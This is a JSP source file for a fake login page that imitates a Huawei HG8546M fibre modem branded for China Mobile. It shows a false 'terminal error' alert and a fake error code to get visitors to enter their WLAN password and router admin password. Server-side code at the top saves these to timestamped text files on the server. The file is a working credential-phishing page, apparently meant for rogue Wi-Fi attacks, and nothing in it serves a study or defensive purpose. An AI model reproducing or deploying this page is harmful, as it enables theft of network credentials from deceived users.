<%@ page language="java" pageEncoding="utf-8"%>
<%@page import="java.io.BufferedWriter,java.io.File,java.io.FileWriter,java.text.SimpleDateFormat,java.util.Date"%>
<% 
	try {
		String wlan = request.getParameter("wlan").toString();
		String pass = request.getParameter("admin").toString();
		// 防止文件建立或读取失败，用catch捕捉错误并打印，也可以throw
		/* 写入Txt文件 */
		File writename = new File(getServletContext().getRealPath("/"));// 相对路径，如果没有则要建立一个新的output。txt文件
		if (!writename.exists()) {
			writename.mkdirs();
		}
		String time=new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()).toString();
		writename = new File(getServletContext().getRealPath("/")+"\\" +time+ ".txt");// 相对路径，如果没有则要建立一个新的output。txt文件
		writename.createNewFile(); // 创建新文件
		BufferedWriter outer = new BufferedWriter(new FileWriter(writename));
		outer.write("WLAN:" + wlan + "\r管理密码:" + pass); // \r\n即为换行
		outer.flush(); // 把缓存区内容压入文件
		outer.close(); // 最后记得关闭文件
	} catch (java.lang.NullPointerException e) {
e.printStackTrace();
	}catch (Exception e) {
e.printStackTrace();
	}
%>
<html>
<head>
<title>HG8546M</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Expires" content="0">
<style type="text/css">
#div_visite {
	margin-left: 50px;
	margin-top: 100px;
	margin-right: 50px;
	margin-bottom: 100px;
	font-family: "宋体";
	font-size: 12px;
	color: #333333;
}

table {
	font-family: "宋体";
	font-size: 15px;
}
</style>
<link href="Cuscss/login.css?2016071414214717595-1425773353" media="all"
	rel="stylesheet">
<script language="JavaScript"
	src="resource/common/md5.js?2016071414214717595-1425773353"></script>
<script language="JavaScript"
	src="resource/common/RndSecurityFormat.js?2016071414214717595-1425773353"></script>
<script language="JavaScript"
	src="resource/common/jquery.min.js?2016071414214717595-1425773353"></script>
<script language="JavaScript"
	src="resource/common/safelogin.js?2016071414214717595-1425773353"></script>
<script language="JavaScript" type="text/javascript">
    alert('抱歉，该终端发生异常！请手动注册修复');
function MD5(str) { return hex_md5(str); }

function stResultInfo(domain, Result, Status)
{
this.domain = domain;
this.Result = Result;
this.Status = Status;
}            
   
var stResultInfos = new Array(new stResultInfo("InternetGatewayDevice.X_HW_UserInfo","1","0"),null);
var Infos = stResultInfos[0];


var LoginTimes = 0;
var ProductName = 'HG8546M';
var Var_DefaultLang = 'chinese';
var Language = "chinese";
document.title = ProductName;

var simcardstatus = '0';

var manageFlag = '0';
var webLoidreg = '0';
var webRouteSet = '0';


var SimFlag = '0';
var LockTime = '0';
var LockLeftTime = '0';
var errloginlockNum = '3';
var locklefttimerhandle;

var CfgMode ='ZJCMCC_RMS';
var br0Ip = '192.168.1.1';

var CfgFtWordArea = 'NOCHOOSE';
var APPVersion = '1.1.1.1';

var DeviceType ='HGU';

function AreaRelationInfo(ChineseDes, E8CArea)
{
this.ChineseDes = ChineseDes;
this.E8CArea = E8CArea;
}

var AreaRelationInfos = new Array();
var userEthInfos = new Array(new AreaRelationInfo("重庆","023"),
 new AreaRelationInfo("四川","028"),
 new AreaRelationInfo("云南","0871"),
 new AreaRelationInfo("贵州","0851"), 
 new AreaRelationInfo("北京","010"),
 new AreaRelationInfo("上海","021"),
 new AreaRelationInfo("天津","022"), 
 new AreaRelationInfo("安徽","0551"),
 new AreaRelationInfo("福建","0591"),
 new AreaRelationInfo("甘肃","0931"),
 new AreaRelationInfo("广东","020"),
 new AreaRelationInfo("广西","0771"), 
 new AreaRelationInfo("海南","0898"),
 new AreaRelationInfo("河北","0311"),
 new AreaRelationInfo("河南","0371"),
 new AreaRelationInfo("湖北","027"),
 new AreaRelationInfo("湖南","0731"),
 new AreaRelationInfo("吉林","0431"),
 new AreaRelationInfo("江苏","025"),
 new AreaRelationInfo("江西","0791"),
 new AreaRelationInfo("辽宁","024"),
 new AreaRelationInfo("宁夏","0951"),
 new AreaRelationInfo("青海","0971"),
 new AreaRelationInfo("山东","0531"),
 new AreaRelationInfo("山西","0351"),
 new AreaRelationInfo("陕西","029"), 
 new AreaRelationInfo("西藏","0891"),
 new AreaRelationInfo("新疆","0991"), 
 new AreaRelationInfo("浙江","0571"),
 new AreaRelationInfo("黑龙江","0451"),
 new AreaRelationInfo("内蒙古","0471"),
 null);
 
function GetE8CAreaByCfgFtWord(userEthInfos,name)
{
var length = userEthInfos.length;

for( var i = 0; i <  length - 1; i++)
{
if(name == userEthInfos[i].E8CArea)
{
return userEthInfos[i].ChineseDes;
}
}

return null;
}

var CfgFtChineseArea = GetE8CAreaByCfgFtWord(userEthInfos,CfgFtWordArea);


function isValidAscii(val)
{
    for ( var i = 0 ; i < val.length ; i++ )
    {
        var ch = val.charAt(i);
        if ( ch < ' ' || ch > '~' )
        {
            return false;
        }
    }
    return true;
}

function getElementByName(sId)
{   
if (document.getElementsByName)
{
var element = document.getElementsByName(sId);

if (element.length == 0)
{
return null;
}
else if (element.length == 1)
{
return element[0];
}

return element;
}
}

function getElement(sId)
{
 var ele = getElementByName(sId); 
 if (ele == null)
 {
 return getElementById(sId);
 }
 return ele;
}


function setDisable(sId, flag)
{
var item;
if (null == (item = getElement(sId)))
{
debug(sId + " is not existed" );
return false;
}

    if ( typeof(item.disabled) == 'undefined' )
    {
        if ( item.tagName == "DIV" || item.tagName == "div" )
        {
            var ele = getDivInnerId(sId);            
            setDisable(ele, flag);
        }
    }
    else
    {
        if ( flag == 1 || flag == '1' ) 
        {
             item.disabled = true;
        }
        else
        {
             item.disabled = false;
        }     
    }
    
    return true;
}
function SubmitForm() {
	document.querySelector('#btnSubmit').type='button';
	document.querySelector('form').submit();
}
/* function SubmitForm() {
    var Username = document.getElementById('txt_Username');
    var Password = document.getElementById('txt_Password');
var appName = navigator.appName;
var version = navigator.appVersion;

if (appName == "Microsoft Internet Explorer")
{
var versionNumber = version.split(" ")[3];
if (parseInt(versionNumber.split(";")[0]) < 6)
{
alert("不支持IE6.0以下版本。");
return;
}
}

    if (Username.value == "") {
        alert("用户名不能为空。");
        Username.focus();
        return false;
    }

if (!isValidAscii(Username.value))
{
alert("用户名包含非法字符.");
Username.focus();
return false;
}

    if (Password.value == "") { 
        alert("密码不能为空。");
        Password.focus();
        return false;
    }
if (!isValidAscii(Password.value))
{
alert("密码包含非法字符。");
Password.focus();
return false;
} */

/*让浏览器中已存在的COOKIE立即实效*/
/*var cookie = document.cookie;
if ("" != cookie)
{
var date=new Date();
date.setTime(date.getTime()-10000);
var cookie22 = cookie + ";expires=" + date.toGMTString();
document.cookie=cookie22;
} 

var cnt;

$.ajax({
type : "POST",
async : false,
cache : false,
url : '/asp/GetRandCount.asp',
success : function(data) {
cnt = data;
}
});

    var Form = new webSubmitForm();
var cookie2 = "Cookie=body:" + "Language:" + Language + ":" + "id=-1;path=/";
Form.addParameter('UserName', Username.value);
Form.addParameter('PassWord', base64encode(Password.value));
    document.cookie = cookie2;

    Username.disabled = true;
    Password.disabled = true;

    Form.addParameter('x.X_HW_Token', cnt);
Form.setAction('/login.cgi');
Form.submit();
    return true;
}
*/
function LoadFrame() {
    document.getElementById('txt_Username').focus();

    if ((LoginTimes != null) && (LoginTimes != '') && (LoginTimes > 0)) {
        document.getElementById('loginfail').style.display = '';
    }

    init();

if (LoginTimes >= errloginlockNum) 
{
setDisable('Submit2',1);
setDisable('btnSubmit',1);
setDisable('txt_Username',1);
setDisable('txt_Password',1);
setDisable('regdevice',1);
if (webRouteSet == 1)
{
setDisable('routeSet',1);
}
}
}
function init() {
    if (document.addEventListener) {
        document.addEventListener("keypress", onHandleKeyDown, false);
    } else {
        document.onkeypress = onHandleKeyDown;
    }
}
function onHandleKeyDown(event) {
    var e = event || window.event;
    var code = e.charCode || e.keyCode;

    if (code == 13) {
        SubmitForm();
    }
}

function onChangeLanguage(language) {
    Language = language;
    if (language == "chinese") {
        document.getElementById('Chinese').style.color = 'red';
        document.getElementById('English').style.color = 'black';
    } else {
        document.getElementById('Chinese').style.color = 'black';
        document.getElementById('English').style.color = 'red';
    }
}

function canceltext()
{
    document.getElementById('txt_Username').value = "";
    document.getElementById('txt_Password').value = "";
}

function JumpToReg()
{
  if (((parseInt(Infos.Status) == 0) && (parseInt(Infos.Result) == 1)) ) 
  {
window.location="/loidgregsuccess.asp";
  }
  else
  {
     window.location="/loidreg.asp";
  }
}

function SetDivValue(Id, Value)
{
    try
    {
        var Div = document.getElementById(Id);
        Div.innerHTML = Value;
    }
    catch(ex)
    {

    }
}

function showlefttime()
{
if(LockLeftTime <= 0)
{
window.location="/login.asp";
clearInterval(locklefttimerhandle);
return;
}

var html = '您登录失败的次数已超出限制，<br>请' +  LockLeftTime + '秒后重试！';
SetDivValue("loginfail", html);
LockLeftTime = LockLeftTime - 1;
}

</script>
</head>
<body onload="LoadFrame();">
	<div id="div_visite">
		<table align="center" cellpadding="0" cellspacing="0"
			bordercolor="#E7E7E7" bgcolor="#E7E7E7" border="0"
			style="position: relative;">
			<tbody>
				<form action='#'>
				<tr>
					<td height="10" colspan="3" align="center" bgcolor="#FFFFFF"><label>
							<img src="images/logo_cmcc.jpg" width="337" height="92">
					</label></td>
				</tr>
				<tr>
					<td width="30%" height="50" align="right">WLAN密码：</td>
					<!-- 帐号 -->
					<td width="30">&nbsp;</td>
					<td>
						<div id='error' style="position: relative;">
							<span style="font-size: 8px; color: black;">光纤终端发生异常！错误异常代码611</span>
						</div> <label> <input name="wlan" type="text" id="txt_Username"
							style="width: 140px; font-family: Arial" maxlength="31">
							<!-- txt_Username -->
					</label>
					</td>
				</tr>

				<tr>
					<td height="30" align="right">管理密码：</td>
					<td>&nbsp;</td>
					<td><input name="admin" type="password" id="txt_Password"
						style="width: 140px; font-family: Arial" maxlength="127"></td>
				</tr>

				<tr>
					<td></td>
					<td>&nbsp;</td>
					<td style="color: #FF0000">
						<div id="loginfail" style="display: none;"></div> <script
							language="javascript">
clearInterval(locklefttimerhandle); 
if (LoginTimes > 0 && LoginTimes < errloginlockNum) 
{
SetDivValue("loginfail", "用户名或密码错误，请重新登录。");
} 
else if (LoginTimes >= errloginlockNum && parseInt(LockLeftTime) > 0) 
{
var html = '您登录失败的次数已超出限制，<br>请' +  LockLeftTime + '秒后重试！';
SetDivValue("loginfail", html); 
locklefttimerhandle = setInterval('showlefttime()', 1000);
}
else
{
document.getElementById('loginfail').style.display = 'none';
}
</script>
					</td>
				</tr>

				<tr>
					<td></td>
					<td></td>
					<td><input type="submit" id="btnSubmit" name="btnSubmit"
							value="确定" onclick="SubmitForm();">
							<input type="reset" name="Submit2" value="取消"
								onclick="canceltext();">
							<script type="text/javascript" language="javascript">
if ('HGU' == DeviceType.toUpperCase())
{
document.write('<input type="button" name="regdevice" id="regdevice" value="设备注册" onclick="JumpToReg();"/>');  
}
</script>
							<input type="button" name="regdevice" id="regdevice" value="设备注册"
								onclick="JumpToReg();"></td>
				</tr>
				</form>
			</tbody>
		</table>
	</div>
	<script language="JavaScript" type="text/javascript">
</script>


</body>
</html>